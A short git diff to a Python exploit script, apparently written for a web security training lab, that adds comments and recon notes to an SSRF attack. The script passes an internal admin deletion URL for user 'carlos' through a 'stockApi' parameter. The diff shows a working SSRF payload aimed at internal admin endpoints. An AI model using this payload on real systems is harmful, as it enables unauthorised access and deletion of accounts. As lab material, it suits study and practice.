@@ -1,3 +1,7 @@
+#our reconasense info is  
+#localhost_URL = http://localhost/
+#admin_URL = http://localhost/admin
+#carlos_deletetion_Url = http://localhost/admin/delete?username=carlos
 import requests
 import sys
 import urllib3
@@ -11,7 +15,7 @@ proxies ={'http' : 'http://127.0.0.1:8080' ,'https':'http://127.0.0.1:8080'}
 
 def delete_user(url):
     #ssrf payload
-    delete_user_url="http://localhost/admin/delete?username=carlos"
+    delete_user_url="http://localhost/admin/delete?username=carlos" #SSRF payload
     check_stock_path="/product/stock"
     params_deletion={'stockApi':delete_user_url}
     #sending request to delete the user
@@ -36,7 +40,7 @@ def delete_user(url):
 def main():
     #in case the user entrered wrong values 
     if(len(sys.argv) != 2):
-        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Usage: %s <url>" % sys.argv[0])#note that %s is name of script
         #user insructions
         print("(+) Example %s www.example.com" % sys.argv[0] )
         #note that % sys.argv[0] stands for the name of the program
